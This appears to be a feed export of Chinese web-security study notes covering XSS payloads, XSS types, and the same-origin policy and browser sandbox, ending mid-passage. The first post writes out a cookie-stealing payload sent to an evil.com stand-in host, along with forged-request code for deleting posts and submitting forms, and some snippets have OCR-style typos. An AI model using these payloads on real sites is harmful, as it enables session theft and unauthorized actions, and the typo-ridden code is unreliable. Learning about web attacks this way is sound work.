class="code"><pre><span class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>加载一个远程脚本，真正的XSS Payload写在远程脚本 <code>evil.js</code> 中。</p><blockquote><p>这样可以避免直接在URL的参数里写入大量的JavaScript代码。</p></blockquote><p>在 <code>evil.js</code>  中，可以通过如下代码窃取Cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img -<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://www.evil.com/log?&quot;</span> + <span class="built_in">escape</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>当用户访问这个构造的url时执行脚本，这段代码在页面中插入了一张看不见的图片，同时把 docnment cookie对象作为参数发送到远程服务器。</p><p>这样就实现了cookie 的劫持</p></li></ol><p>在成功实现XSS攻击后，除了cookie劫持之外，攻击者还有很多更强大的 XSS payload来控制用户的浏览器</p><h1 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h1><ol><li><p><strong>原理</strong></p><p>一个网站的应用，只需要接受HTTP协议中的GET 或 POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p></li><li><p><strong>构造GET请求例子</strong></p><p>假设某博客网站存在XSS漏洞，我们如何通过XSS漏洞来删除掉博客上的某篇文章？</p><p>假设正常删除该文章的链接是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>攻击者可以构造一段javascript代码（XSS Payload）如下，</p><p>这段代码中，通过插入一个img标签来发起一个GET请求，从而对删除文章的链接发出了请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>后续，攻击者只需要通过XSS漏洞诱使用户执行这段XSS Payload，就会删除这篇文章</p></li><li><p><strong>构造POST请求例子</strong></p><p>如果网站上只有一个表单，即仅接收POST请求，如何实施XSS攻击？</p><p>可以通过两种方法实现攻击：</p><ul><li><p><strong>1）构造一个form表单，自动提交这个表单</strong></p><ul><li><p>a. 一个个构造DOM节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;form&quot;</span>);</span><br><span class="line">f.<span class="property">action</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">f.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;input&quot;</span>);</span><br><span class="line">i1.<span class="property">name</span> = <span class="string">&quot;ck&quot;</span>;</span><br><span class="line">i1.<span class="property">value</span> = <span class="string">&quot;JiUY&quot;</span>;</span><br><span class="line">f.<span class="title function_">appendchi1d</span>(i1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input”);</span></span><br><span class="line"><span class="string">i2.name = &quot;</span> mb_text<span class="string">&quot;;</span></span><br><span class="line"><span class="string">i2.value = &quot;</span>testtesttest<span class="string">&quot;;</span></span><br><span class="line"><span class="string">f.appendchild(i2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f.submit();</span></span><br></pre></td></tr></table></figure><blockquote><p>如果表单的参数很多的话，通过构造DOM 节点的方式，代码将会非常冗长。所以可以使用第二种方法，直接写HTML代码，这样会使得整个代码精简很多。</p></blockquote></li><li><p>b. 直接构造HTML代码，如下所示:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = doeument.<span class="property">createElement</span> (<span class="string">&quot;div&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendchild</span>(dd);</span><br><span class="line">dd.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;xssform&quot; name=&quot;mbform&quot;&gt; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type =<span class="string">&quot;hidden&quot;</span> value = <span class="string">&quot;JiUY&quot;</span> name=<span class="string">&quot;ck&quot;</span>/&gt;<span class="string">&#x27; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;testtesttest&quot;</span> name = <span class="string">&quot;mb_text”/&gt;&#x27; + </span></span><br><span class="line"><span class="string">&#x27;&lt;/form&gt;&#x27;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>xssform<span class="string">&quot;).submit();</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>2）通过 XMLHttpRequest 发送一个 POST 请求</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://www.douban.com&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">&quot;ck=JiUY &amp;mb text-test1234&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> ajax =nul1;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpReguest</span>)&#123;</span><br><span class="line">    ajax =<span class="keyword">new</span> <span class="title class_">XMLRttpRequest</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">Activexobject</span>)&#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> <span class="title class_">ActiveXobjeet</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.<span class="property">setRequestHeader</span> (<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>(postStr);</span><br><span class="line"></span><br><span class="line">ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.<span class="property">readystate</span>- <span class="number">4</span>&amp;&amp; ajax.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h1><p>XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”，当出现需要与用户进行交互的情况是，如：碰到验证码、修改密码时需要输入旧密码，XSS Payload就会失效。</p><p>但我们可以通过其他方法来进行攻击：</p><ul><li>验证码：XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施。攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</li><li>修改密码：攻击者可以将XSS与”钓鱼”结合。如：利用 Javascript 在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</li></ul><h1 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h1><p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。</p><p>如何通过JavaScript脚本识别浏览器版本呢？</p><ol><li><p><strong>通过XSS 读取浏览器的UserAgent对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);</span><br></pre></td></tr></table></figure><p>但是userAgent是可以伪造的，同时浏览器的一些拓展也可以屏蔽或自定义UA，这个信息不一定准确。</p></li><li><p><strong>根据浏览器之间的差异识别</strong></p><p>根据每种浏览器独有的对象特征识别浏览器的大版本</p></li></ol><h1 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h1><p>知道用户使用的浏览器、操作系统后，可以通过各种方法<strong>识别用户安装了的软件</strong></p><ol><li><p><strong>通过浏览器控件的classid检测相应软件</strong></p><p>可以通过判断软件对应控件的classid是否存在，来判断用户是否安装了该软件</p><p>如下代码检测迅雷的控件 <code>XunLeiBHO.ThunderIEHelper</code> ，如果存在，用户大概率也安装了迅雷软件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;XunLeiBHO.ThunderIEHelper&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">  <span class="comment">//异常了，不存在该控件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本</strong>。</p></li><li><p><strong>通过第三方软件</strong></p><p>如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript</p></li><li><p><strong>其他</strong></p><p>在Chrome中有一个特殊的协议: chrome:&#x2F;&#x2F; ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome://flashgot/skin/icon32.png</span><br></pre></td></tr></table></figure><p>扫描Chrome扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p></li></ol><h1 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h1><p>通过CSS，来<strong>发现用户曾经访问过的网站</strong></p><p>如果用户曾经访问过某个链接，那么这个链接的颜色会和未访问过的链接颜色不一致。</p><p>对应的POC代码见《白帽子讲web安全》P58</p><p>搜索引擎好像没有这个情况了，但是google scholar仍然存在，访问过的为紫色</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240229200958088.png" alt="image-20240229200958088"></p><h1 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h1><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢?</p><p>可以通过XSS Payload获取客户端的本地IP地址。</p><p>**javascript本身并没有获取本地IP地址的能力。**一般需要第三方软件来完成。</p><p>比如，客户端安装了Java环境(JRE)，那么XSS就可以通过调用J ava Applet 的接口获取客户端的本地IP地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AttackAPI</span>.<span class="property">dom</span>.<span class="property">getInternalIP</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> sock = <span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">Socket</span>();</span><br><span class="line">      sock.<span class="title function_">bind</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">0</span>));</span><br><span class="line">      sock.<span class="title function_">connect</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="variable language_">document</span>.<span class="property">domain</span>,(!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>)?<span class="number">80</span>:<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>));</span><br><span class="line">      <span class="keyword">return</span> sock.<span class="title function_">getLocalAddress</span>().<span class="title function_">getHostAddress</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有两个通过API获取本地网络信息的API见《白帽子讲web安全》P61</p><h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><ol><li><p><strong>定义</strong></p><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，破坏力和影响力巨大。XSS蠕虫借助 Ajax技术实现对Web应用程序中存在的 XSS 漏洞进行自动化利用传播，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p></li><li><p><strong>应用场景与条件</strong></p><p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSSWorm攻击。比如，发送站内信、用户留言等页面，都是xss worm的高发区。</p><blockquote><p>如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p></blockquote></li><li><p><strong>例子</strong></p><ul><li><p><strong>第一个重量级的XSS worm —— Samy worm</strong></p><p>通过在标签的style属性上构造XSS蠕虫</p><p>解析：<a href="https://www.cnblogs.com/milantgh/p/3655070.html">https://www.cnblogs.com/milantgh/p/3655070.html</a></p></li><li><p>百度空间蠕虫</p><p>在CSS代码后插入js代码</p><p>解析：<a href="https://blog.csdn.net/qq_33605106/article/details/79756478">https://blog.csdn.net/qq_33605106/article/details/79756478</a></p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS简介</title>
      <link href="/posts/13a2.html"/>
      <url>/posts/13a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h1><p>XSS全称是Cross Site Scripting，中文为<strong>跨站脚本攻击</strong>，为了和CSS（层叠样式表（<code>Cascading Style Sheets，CSS</code>））区分命名为XSS。</p><p>XSS的原理：在HTML页面中注入恶意脚本，当目标网站目标用户的浏览器渲染HTML文档时，恶意脚本执行，使得黑客可以控制用户浏览器。</p><p>一个简单的例子：</p><p>有一个网页，会将用户输入的内容回显在页面上。</p><p>如果我们在该网页输入如下脚本，脚本的作用就是弹出一个对话框显示用户的Cookie信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果目标服务器没有对这个输入进行检验就直接将其显示在页面上的话，则会生成如下形式的页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这段脚本已经成功嵌入到该页面当中。</p><p>当受害浏览器访问这个页面的时候，这段脚本也将被认为是页面的一部分，从而<strong>被执行</strong>，即弹出对话框显示受害浏览器的Cookie信息。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>根据效果的不同，XSS攻击主要可以分为以下几类：</p><h2 id="反射型XSS（非持久型XSS）"><a href="#反射型XSS（非持久型XSS）" class="headerlink" title="反射型XSS（非持久型XSS）"></a>反射型XSS（非持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>一般情况下，黑客发送给别人发送<strong>带有恶意脚本代码参数的 <code>url</code></strong> ，当用户打开这个带有恶意代码参数的 <code>url</code> 地址时，恶意脚本代码作为输入提交到服务器端，服务器端解析后响应，恶意代码被目标服务器通过**错误信息、搜索结果等等方式“反射”**回显在用户的浏览器上，浏览器解析执行XSS代码。</p><blockquote><p>场景：一般会出现在查询类页面等。</p><p>这种网站一般会显示用户的输入，用户点开会恶意代码参数就会显示在网站上并执行。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>非持久性。攻击脚本不会写入网站的数据库，是一次性的攻击。所以黑客一般需要诱骗用户点击包含攻击脚本的 URL，才能攻击成功。</li><li>需要传递给服务器，通过服务器反射恶意脚本</li></ul></li><li><p><strong>例子</strong></p><p>假设网站有一个搜索功能，该功能接收URL参数中用户提供的搜索词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=gift</span><br></pre></td></tr></table></figure><p>网站在对这个URL的响应中，回显用户提供的搜索词</p><p>假设应用程序不对数据进行任何其他处理，攻击者就可以构造如下的url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他用户访问这个url的时候，对应渲染出来的html应该为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户的浏览器就会执行script内部的恶意代码</p></li></ol><h2 id="存储型XSS（持久型XSS）"><a href="#存储型XSS（持久型XSS）" class="headerlink" title="存储型XSS（持久型XSS）"></a>存储型XSS（持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>黑客利用XSS 漏洞，将内容经正常功能提交进入目标服务器端的数据库中并持久保存。当正常用户请求目标页面时，前端页面获得后端从数据库中读出的注入代码，恰好将其渲染执行。</p><blockquote><p>场景：一般存在于 Form 表单提交等交互功能，如发帖留言，注册页面等。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>稳定性：恶意脚本存入网站服务器端</li></ul></li><li><p><strong>例子</strong></p><p>黑客写下一篇包含有恶意JavaScript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。</p></li></ol><h2 id="DOM-based型XSS"><a href="#DOM-based型XSS" class="headerlink" title="DOM-based型XSS"></a>DOM-based型XSS</h2><ol><li><p><strong>原理</strong></p><p>从效果来看，DOM-based型XSS也属于反射型，但是其形成的原因比较特殊，所以单独拿出来介绍。</p><p><strong>通过DOM操作前端代码输出</strong>的时候形成的XSS为DOM-based型XSS</p><p>客户端的脚本<strong>通过DOM动态地输出数据到页面</strong>而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行。</p><blockquote><p>场景：一般产生于用户能够进行参数输入查询的地方</p><p><strong>网站本地执行url中的参数而并不传给服务器</strong></p></blockquote></li><li><p><strong>特点</strong></p><ul><li>不与后台服务器产生数据交互</li><li>无法从服务器端进行防御。因为构造的url中的恶意代码参数并不传给服务器，而是客户端获得DOM中的数据直接在本地执行，服务器无法检测到。</li><li>通过客户端脚本在浏览器端触发</li></ul></li><li><p><strong>例子</strong></p><p>有一个网站，包含一个搜索框，用户输入关键字并点击搜索按钮，搜索结果会显示在页面上。网站使用JavaScript来获取URL中的搜索词并将其显示在页面上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/1637811827_619f06737e8996f4cbccd.png" alt="img"></p><p>可以看到网站直接通过document.write从url中提取参数并将参数打印在网页上，而并没有将参数传给服务器</p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用户访问该url时直接本地执行xss代码</p></li></ol><h1 id="XSS攻击学习平台"><a href="#XSS攻击学习平台" class="headerlink" title="XSS攻击学习平台"></a>XSS攻击学习平台</h1><ul><li>Attack API</li><li>BeEF</li><li>XSS-Proxy</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『浏览器安全』浏览器同源策略与沙箱</title>
      <link href="/posts/77ff.html"/>
      <url>/posts/77ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="同源策略的定义"><a href="#同源策略的定义" class="headerlink" title="同源策略的定义"></a>同源策略的定义</h2><p>我们的浏览器出于安全考虑，只允许与<strong>本域</strong>下的接口交互。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</p><h2 id="同源策略的应用"><a href="#同源策略的应用" class="headerlink" title="同源策略的应用"></a>同源策略的应用</h2><p>如果没有同源策略，别人就可以轻松的获取我们网站的 cookie 信息， 或是对网页进行DOM操作，可能会造成数据被盗取等后果。</p><p>例如，它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，从第三方网络邮件服务（用户已登录）或公司内网（因没有公共 IP 地址而受到保护，不会被攻击者直接访问）读取数据，并将这些数据转发给攻击者</p><h2 id="本域与跨域"><a href="#本域与跨域" class="headerlink" title="本域与跨域"></a>本域与跨域</h2><p>在<strong>同一个协议、主机、端口</strong>下的页面属于同一个域（即本域），否则就是跨域。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240125204517169.png" alt="image-20240125204517169"></p><blockquote><p>同主机：表示的是主机名相同，而并不是域名。比如上面的例子，第一个例子的主机名为 <code>store.company.com</code> ，最后一个例子的主机名为 <code>news.company.com</code> ，两个例子的主机名不相同，但是域名均为 <code>company.com</code> ，不同源</p></blockquote><p>如果是以下两个链接进行数据交互，可以通过同源策略的检测，允许交互：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.angular.cn:80/guide/inputs-outputs</span><br><span class="line">https://www.angular.cn:80/guide/index</span><br></pre></td></tr></table></figure><p>而如果是以下这样的链接交互数据，则不能通过同源策略的检测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.child.a.com/test/index.html ----失败，域名不同</span><br><span class="line">https://www.a.com/test/index.html ----失败，协议不同</span><br><span class="line">http://www.a.com:8080/test/index.html ----失败，端口号不同</span><br></pre></td></tr></table></figure><p>所以就会牵引出一个问题，<strong>不同源的数据如何进行交互？</strong></p><h2 id="跨域数据交互问题"><a href="#跨域数据交互问题" class="headerlink" title="跨域数据交互问题"></a>跨域数据交互问题</h2><p>如何跨域加载资源？</p><ol><li><p><strong>一些特殊的标签</strong></p><p><code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签可以跨域加载资源</p><p>如：可以通过下面的代码访问其他域下的脚本文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过jsonp来实现跨域请求</strong></p></li><li><p><strong>通过CORS（跨域资源共享）实现跨域请求</strong></p></li><li><p><strong>通过代理实现跨域请求</strong><br>我们都知道同源策略是浏览器自带的，那么我们如果要避免同源策略进行跨域请求，我们可以通过代理服务器的方式进行请求，例如我们请求一个与自身不同域的脚本文件，那么我们可以<strong>先请求与自身同域的一个 url ，然后通过代理服务器进行跳转， 最后返回由代理服务器请求到的脚本文件</strong></p></li></ol><blockquote><p>详细的例子归纳见：<a href="https://blog.csdn.net/l_ppp/article/details/106402136">https://blog.csdn.net/l_ppp/article/details/106402136</a></p></blockquote><h2 id="浏览器第三方插件的同源策略"><a href="#浏览器第三方插件的同源策略" class="headerlink" title="浏览器第三方插件的同源策略"></a>浏览器第三方插件的同源策略</h2><p>对于浏览器来说，浏览器加载的一些第三方插件也有各自的同源策略。</p><p>最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p><h1 id="浏览器沙箱（sandbox）"><a href="#浏览器沙箱（sandbox）" class="headerlink" title="浏览器沙箱（sandbox）"></a>浏览器沙箱（sandbox）</h1><p>以chrome浏览器为例，采用了<strong>多进程架构</strong>，主要进程包括：浏览器进程、渲染进程、插件进程和拓展进程。插件进程如flash、java、pdf 